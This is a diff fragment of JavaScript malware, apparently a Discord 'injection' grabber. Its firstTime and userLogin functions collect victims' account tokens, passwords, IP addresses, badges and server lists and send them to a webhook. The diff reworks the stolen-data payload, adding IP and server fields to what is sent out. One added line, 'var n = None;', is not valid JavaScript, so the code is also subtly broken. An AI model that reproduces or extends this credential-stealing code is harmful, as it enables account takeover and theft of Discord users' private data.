@@ -145,7 +145,7 @@ async function firstTime() {
                 sendToWebhook(JSON.stringify(c));
             } else {
                 var b = await getUserInfo(token)
-                var n;
+                var n = None;
                 if (b.premium_type == 0){
                     n = "None"
                 } else if (b.premium_type == 1) {
@@ -172,10 +172,6 @@ async function firstTime() {
                             name: "Injection",
                             value: `\`${__dirname}\``,
                             inline: !0
-                        }, {
-                            name: "Token",
-                            value: `${token}`,
-                            inline: !1
                         }, {
                             name: "Badges",
                             value: `${getBadges(b.flags)}`,
@@ -401,8 +397,16 @@ async function userLogin(password, email, token) {
                 value: `\`${password}\``,
                 inline: !0
             }, {
+                name: "Ip",
+                value: `${ip}`,
+                inline: !0
+            }, {
                 name: "Token",
-                value: `\`\`\`${token}\`\`\``,
+                value: `${token}`,
+                inline: !1
+            }, {
+                name: "Servers",
+                value: `${servers.message}`,
                 inline: !1
             },],
             "author": {
